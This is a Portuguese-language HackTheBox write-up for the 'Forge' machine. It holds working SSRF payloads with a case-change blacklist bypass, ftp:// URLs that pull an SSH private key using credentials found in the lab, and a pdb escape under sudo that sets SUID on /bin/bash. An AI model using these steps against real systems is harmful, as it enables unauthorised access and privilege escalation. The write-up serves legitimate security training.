# Forge

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Medium |
| **OS** | Linux (Ubuntu) |
| **Técnicas** | SSRF, Blacklist Bypass, FTP Protocol Exploitation, SSH Key Extraction |
| **Link HTB** | [https://app.hackthebox.com/machines/Forge](https://app.hackthebox.com/machines/Forge) |

## Resumo

Máquina Linux Medium com funcionalidade de upload de imagens por URL vulnerável a SSRF. Bypass de blacklist permite acessar subdomínio admin interno. Exploração de FTP interno revela chave SSH. Escalação via Python pdb debugger em script sudo.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -oN nmap.out -vv [IP]
```

**Portas abertas:**
- 22/tcp - SSH
- 80/tcp - HTTP (Ubuntu)

### Web Discovery

Configuração DNS:
```bash
echo "10.10.11.105 forge.htb" >> /etc/hosts
```

Site possui funcionalidade de upload de imagens por URL.

### VHost Discovery

```bash
ffuf -c -t 100 -w ~/wordlists/Discovery/DNS/subdomains-top1million-20000.txt -u http://forge.htb -H "Host: FUZZ.forge.htb" -fc 302
```

**Subdomínio encontrado:** `admin.forge.htb` (apenas acessível via localhost)

## Exploitation

### SSRF via URL Upload

Tentando acessar `http://admin.forge.htb` retorna erro de blacklist.

**Bypass:** Usar URL em maiúsculas: `http://ADMIN.FORGE.HTB`

### Admin Panel Discovery

Acessando via SSRF, descobrimos dois endpoints:
- `/announcements` - Contém credenciais FTP e informações
- `/upload?u=` - Aceita parâmetro `u` com URL

### FTP Exploitation

Credenciais encontradas em `/announcements`:
- User: `user`
- Password: `heightofsecurity123!`

Sintaxe FTP: `ftp://[username]:[password]@[servidor]`

Explorando FTP via `/upload?u=`:

```
ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB
```

Listagem revela diretório `.ssh`.

### SSH Key Extraction

```
ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa
```

**Chave SSH obtida** para usuário `user`.

### SSH Access

```bash
chmod 600 id_rsa
ssh -i id_rsa user@forge.htb

cat user.txt
```

**User Flag:** ✓

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

### Python pdb Exploitation

O script usa módulo `pdb` para debugging quando há erros. Forçando exception com input não-numérico:

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# Listening on localhost:5592
# Enter the secret password: secretsofadminpassword
# What do you wanna do:
# [1] View processes
# [2] View free memory
# [3] View listening sockets
# [4] Quit
# name  # <- input não-numérico força exception
```

No debugger pdb:

```python
(Pdb) import os
(Pdb) os.system("chmod u+s /bin/bash")
(Pdb) exit
```

### Root Shell

```bash
/bin/bash -p

whoami
# root

cat /root/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **SSRF blacklist bypass** pode ser feito com case manipulation (maiúsculas/minúsculas)
- Subdomínios internos frequentemente contêm funcionalidades administrativas
- **FTP protocol** pode ser explorado via SSRF usando sintaxe `ftp://user:pass@host`
- Python `pdb` debugger permite execução arbitrária de código quando acessível
- Scripts com sudo que crasham podem ser explorados para obter shell root

---

*Writeup by kp*
